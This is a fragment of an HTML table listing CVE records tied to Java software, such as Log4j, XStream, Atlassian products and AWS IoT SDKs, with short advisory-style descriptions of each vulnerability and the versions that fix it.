		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-1451">CVE-2022-1451</a></td>
		<td valign="top">Out-of-bounds Read in r_bin_java_constant_value_attr_new function in GitHub repository radareorg/radare2 prior to 5.7.0. The bug causes the program reads data past the end 2f the intented buffer. Typically, this can allow attackers to read sensitive information from other memory locations or cause a crash. More details see [CWE-125: Out-of-bounds read](https://cwe.mitre.org/data/definitions/125.html).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-1279">CVE-2022-1279</a></td>
		<td valign="top">A vulnerability in the encryption implementation of EBICS messages in the open source librairy ebics-java/ebics-java-client allows an attacker sniffing network traffic to decrypt EBICS payloads. This issue affects: ebics-java/ebics-java-client versions prior to 1.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-0070">CVE-2022-0070</a></td>
		<td valign="top">Incomplete fix for CVE-2021-3100. The Apache Log4j hotpatch package starting with log4j-cve-2021-44228-hotpatch-1.1-16 will now explicitly mimic the Linux capabilities and cgroups of the target Java process that the hotpatch is applied to.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-46372">CVE-2021-46372</a></td>
		<td valign="top">Scoold 1.47.2 is a Q&amp;A/knowledge base platform written in Java. When writing a Q&amp;A, the markdown editor is vulnerable to a XSS attack when using uppercase letters.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-45983">CVE-2021-45983</a></td>
		<td valign="top">NetScout nGeniusONE 6.3.2 allows Java RMI Code Execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-45414">CVE-2021-45414</a></td>
		<td valign="top">A Remote Code Execution (RCE) vulnerability exists in DataRobot through 2021-10-28 because it allows submission of a Docker environment or Java driver.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-45046">CVE-2021-45046</a></td>
		<td valign="top">It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in an information leak and remote code execution in some environments and local code execution in all environments. Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) fix this issue by removing support for message lookup patterns and disabling JNDI functionality by default.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-44832">CVE-2021-44832</a></td>
		<td valign="top">Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a remote code execution (RCE) attack when a configuration uses a JDBC Appender with a JNDI LDAP data source URI when an attacker has control of the target LDAP server. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-4438">CVE-2021-4438</a></td>
		<td valign="top">A vulnerability, which was classified as critical, has been found in kyivstarteam react-native-sms-user-consent up to 1.1.4 on Android. Affected by this issue is the function registerReceiver of the file android/src/main/java/ua/kyivstar/reactnativesmsuserconsent/SmsUserConsentModule.kt. The manipulation leads to improper export of android application components. Attacking locally is a requirement. Upgrading to version 1.1.5 is able to address this issue. The name of the patch is 5423dcb0cd3e4d573b5520a71fa08aa279e4c3c7. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-259508.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-43859">CVE-2021-43859</a></td>
		<td valign="top">XStream is an open source java library to serialize objects to XML and back again. Versions prior to 1.4.19 may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream. XStream 1.4.19 monitors and accumulates the time it takes to add elements to collections and throws an exception if a set threshold is exceeded. Users are advised to upgrade as soon as possible. Users unable to upgrade may set the NO_REFERENCE mode to prevent recursion. See GHSA-rmr5-cpv2-vgjf for further details on a workaround if an upgrade is not possible.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-43821">CVE-2021-43821</a></td>
		<td valign="top">Opencast is an Open Source Lecture Capture &amp; Video Management for Education. Opencast before version 9.10 or 10.6 allows references to local file URLs in ingested media packages, allowing attackers to include local files from Opencast's host machines and making them available via the web interface. Before Opencast 9.10 and 10.6, Opencast would open and include local files during ingests. Attackers could exploit this to include most local files the process has read access to, extracting secrets from the host machine. An attacker would need to have the privileges required to add new media to exploit this. But these are often widely given. The issue has been fixed in Opencast 10.6 and 11.0. You can mitigate this issue by narrowing down the read access Opencast has to files on the file system using UNIX permissions or mandatory access control systems like SELinux. This cannot prevent access to files Opencast needs to read though and we highly recommend updating.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-43570">CVE-2021-43570</a></td>
		<td valign="top">The verify function in the Stark Bank Java ECDSA library (ecdsa-java) 1.0.0 fails to check that the signature is non-zero, which allows attackers to forge signatures on arbitrary messages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-43393">CVE-2021-43393</a></td>
		<td valign="top">STMicroelectronics STSAFE-J 1.1.4, J-SAFE3 1.2.5, and J-SIGN sometimes allow attackers to abuse signature verification. This is associated with the ECDSA signature algorithm on the Java Card J-SAFE3 and STSAFE-J platforms exposing a 3.0.4 Java Card API. It is exploitable for STSAFE-J in closed configuration and J-SIGN (when signature verification is activated) but not for J-SAFE3 EPASS BAC and EAC products. It might also impact other products based on the J-SAFE-3 Java Card platform.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-43392">CVE-2021-43392</a></td>
		<td valign="top">STMicroelectronics STSAFE-J 1.1.4, J-SAFE3 1.2.5, and J-SIGN sometimes allow attackers to obtain information on cryptographic secrets. This is associated with the ECDSA signature algorithm on the Java Card J-SAFE3 and STSAFE-J platforms exposing a 3.0.4 Java Card API. It is exploitable for STSAFE-J in closed configuration and J-SIGN (when signature verification is activated) but not for J-SAFE3 EPASS BAC and EAC products. It might also impact other products based on the J-SAFE-3 Java Card platform.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-42967">CVE-2021-42967</a></td>
		<td valign="top">Unrestricted file upload in /novel-admin/src/main/java/com/java2nb/common/controller/FileController.java in novel-plus all versions allows allows an attacker to upload malicious JSP files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-4295">CVE-2021-4295</a></td>
		<td valign="top">A vulnerability classified as problematic was found in ONC code-validator-api up to 1.0.30. This vulnerability affects the function vocabularyValidationConfigurations of the file src/main/java/org/sitenv/vocabularies/configuration/CodeValidatorApiConfiguration.java of the component XML Handler. The manipulation leads to xml external entity reference. Upgrading to version 1.0.31 is able to address this issue. The name of the patch is fbd8ea121755a2d3d116b13f235bc8b61d8449af. It is recommended to upgrade the affected component. VDB-217018 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-4289">CVE-2021-4289</a></td>
		<td valign="top">A vulnerability classified as problematic was found in OpenMRS openmrs-module-referenceapplication up to 2.11.x. Affected by this vulnerability is the function post of the file omod/src/main/java/org/openmrs/module/referenceapplication/page/controller/UserAppPageController.java of the component User App Page. The manipulation of the argument AppId leads to cross site scripting. The attack can be launched remotely. Upgrading to version 2.12.0 is able to address this issue. The name of the patch is 0410c091d46eed3c132fe0fcafe5964182659f74. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216883.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-4266">CVE-2021-4266</a></td>
		<td valign="top">A vulnerability classified as problematic has been found in Webdetails cpf up to 9.5.0.0-80. Affected is an unknown function of the file core/src/main/java/pt/webdetails/cpf/packager/DependenciesPackage.java. The manipulation of the argument baseUrl leads to cross site scripting. It is possible to launch the attack remotely. Upgrading to version 9.5.0.0-81 is able to address this issue. The name of the patch is 3bff900d228e8cae3af256b447c5d15bdb03c174. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216468.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-42575">CVE-2021-42575</a></td>
		<td valign="top">The OWASP Java HTML Sanitizer before 20211018.1 does not properly enforce policies associated with the SELECT, STYLE, and OPTION elements.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-42064">CVE-2021-42064</a></td>
		<td valign="top">If configured to use an Oracle database and if a query is created using the flexible search java api with a parameterized "in" clause, SAP Commerce - versions 1905, 2005, 2105, 2011, allows attacker to execute crafted database queries, exposing backend database. The vulnerability is present if the parameterized "in" clause accepts more than 1000 values.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41766">CVE-2021-41766</a></td>
		<td valign="top">Apache Karaf allows monitoring of applications and the Java runtime by using the Java Management Extensions (JMX). JMX is a Java RMI based technology that relies on Java serialized objects for client server communication. Whereas the default JMX implementation is hardened against unauthenticated deserialization attacks, the implementation used by Apache Karaf is not protected against this kind of attack. The impact of Java deserialization vulnerabilities strongly depends on the classes that are available within the targets class path. Generally speaking, deserialization of untrusted data does always represent a high security risk and should be prevented. The risk is low as, by default, Karaf uses a limited set of classes in the JMX server class path. It depends of system scoped classes (e.g. jar in the lib folder).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41619">CVE-2021-41619</a></td>
		<td valign="top">An issue was discovered in Gradle Enterprise before 2021.1.2. There is potential remote code execution via the application startup configuration. The installation configuration user interface (available to administrators) allows specifying arbitrary Java Virtual Machine startup options. Some of these options, such as -XX:OnOutOfMemoryError, allow specifying a command to be run on the host. This can be abused to run arbitrary commands on the host, should an attacker gain administrative access to the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41588">CVE-2021-41588</a></td>
		<td valign="top">In Gradle Enterprise before 2021.1.3, a crafted request can trigger deserialization of arbitrary unsafe Java objects. The attacker must have the encryption and signing keys.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41419">CVE-2021-41419</a></td>
		<td valign="top">QVIS NVR DVR before 2021-12-13 is vulnerable to Remote Code Execution via Java deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41272">CVE-2021-41272</a></td>
		<td valign="top">Besu is an Ethereum client written in Java. Starting in version 21.10.0, changes in the implementation of the SHL, SHR, and SAR operations resulted in the introduction of a signed type coercion error in values that represent negative values for 32 bit signed integers. Smart contracts that ask for shifts between approximately 2 billion and 4 billion bits (nonsensical but valid values for the operation) will fail to execute and hence fail to validate. In networks where vulnerable versions are mining with other clients or non-vulnerable versions this will result in a fork and the relevant transactions will not be included in the fork. In networks where vulnerable versions are not mining (such as Rinkeby) no fork will result and the validator nodes will stop accepting blocks. In networks where only vulnerable versions are mining the relevant transaction will not be included in any blocks. When the network adds a non-vulnerable version the network will act as in the first case. Besu 21.10.2 contains a patch for this issue. Besu 21.7.4 is not vulnerable and clients can roll back to that version. There is a workaround available: Once a transaction with the relevant shift operations is included in the canonical chain, the only remediation is to make sure all nodes are on non-vulnerable versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41269">CVE-2021-41269</a></td>
		<td valign="top">cron-utils is a Java library to define, parse, validate, migrate crons as well as get human readable descriptions for them. In affected versions A template Injection was identified in cron-utils enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability. Versions up to 9.1.2 are susceptible to this vulnerability. Please note, that only projects using the @Cron annotation to validate untrusted Cron expressions are affected. The issue was patched and a new version was released. Please upgrade to version 9.1.6. There are no known workarounds known.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-4106">CVE-2021-4106</a></td>
		<td valign="top">A vulnerability in Snow Inventory Java Scanner allows an attacker to run malicious code at a higher level of privileges. This issue affects: SNOW Snow Inventory Java Scanner 1.0

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41041">CVE-2021-41041</a></td>
		<td valign="top">In Eclipse Openj9 before version 0.32.0, Java 8 &amp; 11 fail to throw the exception captured during bytecode verification when verification is triggered by a MethodHandle invocation, allowing unverified methods to be invoked using MethodHandles.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-41034">CVE-2021-41034</a></td>
		<td valign="top">The build of some language stacks of Eclipse Che version 6 includes pulling some binaries from an unsecured HTTP endpoint. As a consequence the builds of such stacks are vulnerable to MITM attacks that allow the replacement of the original binaries with arbitrary ones. The stacks involved are Java 8 (alpine and centos), Android and PHP. The vulnerability is not exploitable at runtime but only when building Che.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-40831">CVE-2021-40831</a></td>
		<td valign="top">The AWS IoT Device SDK v2 for Java, Python, C++ and Node.js appends a user supplied Certificate Authority (CA) to the root CAs instead of overriding it on macOS systems. Additionally, SNI validation is also not enabled when the CA has been &amp;#8220;overridden&amp;#8221;. TLS handshakes will thus succeed if the peer can be verified either from the user-supplied CA or the system&amp;#8217;s default trust-store. Attackers with access to a host&amp;#8217;s trust stores or are able to compromise a certificate authority already in the host's trust store (note: the attacker must also be able to spoof DNS in this case) may be able to use this issue to bypass CA pinning. An attacker could then spoof the MQTT broker, and either drop traffic and/or respond with the attacker's data, but they would not be able to forward this data on to the MQTT broker because the attacker would still need the user's private keys to authenticate against the MQTT broker. The 'aws_tls_ctx_options_override_default_trust_store_*' function within the aws-c-io submodule has been updated to address this behavior. This issue affects: Amazon Web Services AWS IoT Device SDK v2 for Java versions prior to 1.5.0 on macOS. Amazon Web Services AWS IoT Device SDK v2 for Python versions prior to 1.7.0 on macOS. Amazon Web Services AWS IoT Device SDK v2 for C++ versions prior to 1.14.0 on macOS. Amazon Web Services AWS IoT Device SDK v2 for Node.js versions prior to 1.6.0 on macOS. Amazon Web Services AWS-C-IO 0.10.7 on macOS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-40830">CVE-2021-40830</a></td>
		<td valign="top">The AWS IoT Device SDK v2 for Java, Python, C++ and Node.js appends a user supplied Certificate Authority (CA) to the root CAs instead of overriding it on Unix systems. TLS handshakes will thus succeed if the peer can be verified either from the user-supplied CA or the system&amp;#8217;s default trust-store. Attackers with access to a host&amp;#8217;s trust stores or are able to compromise a certificate authority already in the host's trust store (note: the attacker must also be able to spoof DNS in this case) may be able to use this issue to bypass CA pinning. An attacker could then spoof the MQTT broker, and either drop traffic and/or respond with the attacker's data, but they would not be able to forward this data on to the MQTT broker because the attacker would still need the user's private keys to authenticate against the MQTT broker. The 'aws_tls_ctx_options_override_default_trust_store_*' function within the aws-c-io submodule has been updated to override the default trust store. This corrects this issue. This issue affects: Amazon Web Services AWS IoT Device SDK v2 for Java versions prior to 1.5.0 on Linux/Unix. Amazon Web Services AWS IoT Device SDK v2 for Python versions prior to 1.6.1 on Linux/Unix. Amazon Web Services AWS IoT Device SDK v2 for C++ versions prior to 1.12.7 on Linux/Unix. Amazon Web Services AWS IoT Device SDK v2 for Node.js versions prior to 1.5.3 on Linux/Unix. Amazon Web Services AWS-C-IO 0.10.4 on Linux/Unix.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-40829">CVE-2021-40829</a></td>
		<td valign="top">Connections initialized by the AWS IoT Device SDK v2 for Java (versions prior to 1.4.2), Python (versions prior to 1.6.1), C++ (versions prior to 1.12.7) and Node.js (versions prior to 1.5.3) did not verify server certificate hostname during TLS handshake when overriding Certificate Authorities (CA) in their trust stores on MacOS. This issue has been addressed in aws-c-io submodule versions 0.10.5 onward. This issue affects: Amazon Web Services AWS IoT Device SDK v2 for Java versions prior to 1.4.2 on macOS. Amazon Web Services AWS IoT Device SDK v2 for Python versions prior to 1.6.1 on macOS. Amazon Web Services AWS IoT Device SDK v2 for C++ versions prior to 1.12.7 on macOS. Amazon Web Services AWS IoT Device SDK v2 for Node.js versions prior to 1.5.3 on macOS. Amazon Web Services AWS-C-IO 0.10.4 on macOS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-40828">CVE-2021-40828</a></td>
		<td valign="top">Connections initialized by the AWS IoT Device SDK v2 for Java (versions prior to 1.3.3), Python (versions prior to 1.5.18), C++ (versions prior to 1.12.7) and Node.js (versions prior to 1.5.1) did not verify server certificate hostname during TLS handshake when overriding Certificate Authorities (CA) in their trust stores on Windows. This issue has been addressed in aws-c-io submodule versions 0.9.13 onward. This issue affects: Amazon Web Services AWS IoT Device SDK v2 for Java versions prior to 1.3.3 on Microsoft Windows. Amazon Web Services AWS IoT Device SDK v2 for Python versions prior to 1.5.18 on Microsoft Windows. Amazon Web Services AWS IoT Device SDK v2 for C++ versions prior to 1.12.7 on Microsoft Windows. Amazon Web Services AWS IoT Device SDK v2 for Node.js versions prior to 1.5.3 on Microsoft Windows.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-40690">CVE-2021-40690</a></td>
		<td valign="top">All versions of Apache Santuario - XML Security for Java prior to 2.2.3 and 2.1.7 are vulnerable to an issue where the "secureValidation" property is not passed correctly when creating a KeyInfo from a KeyInfoReference element. This allows an attacker to abuse an XPath Transform to extract any local .xml files in a RetrievalMethod element.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39181">CVE-2021-39181</a></td>
		<td valign="top">OpenOlat is a web-based learning management system (LMS). Prior to version 15.3.18, 15.5.3, and 16.0.0, using a prepared import XML file (e.g. a course) any class on the Java classpath can be instantiated, including spring AOP bean factories. This can be used to execute code arbitrary code by the attacker. The attack requires an OpenOlat user account with the authoring role. It can not be exploited by unregistered users. The problem is fixed in versions 15.3.18, 15.5.3, and 16.0.0. There are no known workarounds aside from upgrading.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39180">CVE-2021-39180</a></td>
		<td valign="top">OpenOLAT is a web-based learning management system (LMS). A path traversal vulnerability exists in versions prior to 15.3.18, 15.5.3, and 16.0.0. Using a specially prepared ZIP file, it is possible to overwrite any file that is writable by the application server user (e.g. the tomcat user). Depending on the configuration this can be limited to files of the OpenOlat user data directory, however, if not properly set up, the attack could also be used to overwrite application server config files, java code or even operating system files. The attack could be used to corrupt or modify any OpenOlat file such as course structures, config files or temporary test data. Those attack would require in-depth knowledge of the installation and thus more theoretical. If the app server configuration allows the execution of jsp files and the path to the context is known, it is also possible to execute java code. If the app server runs with the same user that is used to deploy the OpenOlat code or has write permissions on the OpenOlat code files and the path to the context is know, code injection is possible. The attack requires an OpenOlat user account to upload a ZIP file and trigger the unzip method. It can not be exploited by unregistered users. The problem is fixed in versions 15.3.18, 15.5.3 and 16.0.0. There are no known workarounds aside from upgrading.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39177">CVE-2021-39177</a></td>
		<td valign="top">Geyser is a bridge between Minecraft: Bedrock Edition and Minecraft: Java Edition. Versions of Geyser prior to 1.4.2-SNAPSHOT allow anyone that can connect to the server to forge a LoginPacket with manipulated JWT token allowing impersonation as any user. Version 1.4.2-SNAPSHOT contains a patch for the issue. There are no known workarounds aside from upgrading.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39153">CVE-2021-39153</a></td>
		<td valign="top">XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream, if using the version out of the box with Java runtime version 14 to 8 or with JavaFX installed. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39152">CVE-2021-39152</a></td>
		<td valign="top">XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream with a Java runtime version 14 to 8. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.18.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39150">CVE-2021-39150</a></td>
		<td valign="top">XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream with a Java runtime version 14 to 8. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the [Security Framework](https://x-stream.github.io/security.html#framework), you will have to use at least version 1.4.18.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39139">CVE-2021-39139</a></td>
		<td valign="top">XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. A user is only affected if using the version out of the box with JDK 1.7u21 or below. However, this scenario can be adjusted easily to an external Xalan that works regardless of the version of the Java runtime. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39128">CVE-2021-39128</a></td>
		<td valign="top">Affected versions of Atlassian Jira Server or Data Center using the Jira Service Management addon allow remote attackers with JIRA Administrators access to execute arbitrary Java code via a server-side template injection vulnerability in the Email Template feature. The affected versions of Jira Server or Data Center are before version 8.13.12, and from version 8.14.0 before 8.19.1.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39115">CVE-2021-39115</a></td>
		<td valign="top">Affected versions of Atlassian Jira Service Management Server and Data Center allow remote attackers with "Jira Administrators" access to execute arbitrary Java code or run arbitrary system commands via a Server_Side Template Injection vulnerability in the Email Template feature. The affected versions are before version 4.13.9, and from version 4.14.0 before 4.18.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-39114">CVE-2021-39114</a></td>
		<td valign="top">Affected versions of Atlassian Confluence Server and Data Center allow users with a valid account on a Confluence Data Center instance to execute arbitrary Java code or run arbitrary system commands by injecting an OGNL payload. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-38163">CVE-2021-38163</a></td>
		<td valign="top">SAP NetWeaver (Visual Composer 7.0 RT) versions - 7.30, 7.31, 7.40, 7.50, without restriction, an attacker authenticated as a non-administrative user can upload a malicious file over a network and trigger its processing, which is capable of running operating system commands with the privilege of the Java Server process. These commands can be used to read or modify any information on the server or shut the server down making it unavailable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37942">CVE-2021-37942</a></td>
		<td valign="top">A local privilege escalation issue was found with the APM Java agent, where a user on the system could attach a malicious plugin to an application running the APM Java agent. By using this vulnerability, an attacker could execute code at a potentially higher level of permissions than their user typically has access to.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37941">CVE-2021-37941</a></td>
		<td valign="top">A local privilege escalation issue was found with the APM Java agent, where a user on the system could attach a malicious file to an application running with the APM Java agent. Using this vector, a malicious or compromised user account could use the agent to run commands at a higher level of permissions than they possess. This vulnerability affects users that have set up the agent via the attacher cli 3, the attach API 2, as well as users that have enabled the profiling_inferred_spans_enabled option

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37819">CVE-2021-37819</a></td>
		<td valign="top">PDF Labs pdftk-java v3.2.3 was discovered to contain an infinite loop via the component /text/pdf/PdfReader.java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37714">CVE-2021-37714</a></td>
		<td valign="top">jsoup is a Java library for working with HTML. Those using jsoup versions prior to 1.14.2 to parse untrusted HTML or XML may be vulnerable to DOS attacks. If the parser is run on user supplied input, an attacker may supply content that causes the parser to get stuck (loop indefinitely until cancelled), to complete more slowly than usual, or to throw an unexpected exception. This effect may support a denial of service attack. The issue is patched in version 1.14.2. There are a few available workarounds. Users may rate limit input parsing, limit the size of inputs based on system resources, and/or implement thread watchdogs to cap and timeout parse runtimes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37694">CVE-2021-37694</a></td>
		<td valign="top">@asyncapi/java-spring-cloud-stream-template generates a Spring Cloud Stream (SCSt) microservice. In versions prior to 0.7.0 arbitrary code injection was possible when an attacker controls the AsyncAPI document. An example is provided in GHSA-xj6r-2jpm-qvxp. There are no mitigations available and all users are advised to update.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37579">CVE-2021-37579</a></td>
		<td valign="top">The Dubbo Provider will check the incoming request and the corresponding serialization type of this request meet the configuration set by the server. But there's an exception that the attacker can use to skip the security check (when enabled) and reaching a deserialization operation with native java serialization. Apache Dubbo 2.7.13, 3.0.2 fixed this issue by quickly fail when any unrecognized request was found.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37578">CVE-2021-37578</a></td>
		<td valign="top">Apache jUDDI uses several classes related to Java's Remote Method Invocation (RMI) which (as an extension to UDDI) provides an alternate transport for accessing UDDI services. RMI uses the default Java serialization mechanism to pass parameters in RMI invocations. A remote attacker can send a malicious serialized object to the above RMI entries. The objects get deserialized without any check on the incoming data. In the worst case, it may let the attacker run arbitrary code remotely. For both jUDDI web service applications and jUDDI clients, the usage of RMI is disabled by default. Since this is an optional feature and an extension to the UDDI protocol, the likelihood of impact is low. Starting with 3.3.10, all RMI related code was removed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37573">CVE-2021-37573</a></td>
		<td valign="top">A reflected cross-site scripting (XSS) vulnerability in the web server TTiny Java Web Server and Servlet Container (TJWS) &lt;=1.115 allows an adversary to inject malicious code on the server's "404 Page not Found" error page

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-37535">CVE-2021-37535</a></td>
		<td valign="top">SAP NetWeaver Application Server Java (JMS Connector Service) - versions 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, does not perform necessary authorization checks for user privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-36981">CVE-2021-36981</a></td>
		<td valign="top">In the server in SerNet verinice before 1.22.2, insecure Java deserialization allows remote authenticated attackers to execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35619">CVE-2021-35619</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 12.2.0.1, 19c and 21c. Difficult to exploit vulnerability allows low privileged attacker having Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.1 Base Score 7.1 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H).

</td>
	</tr>
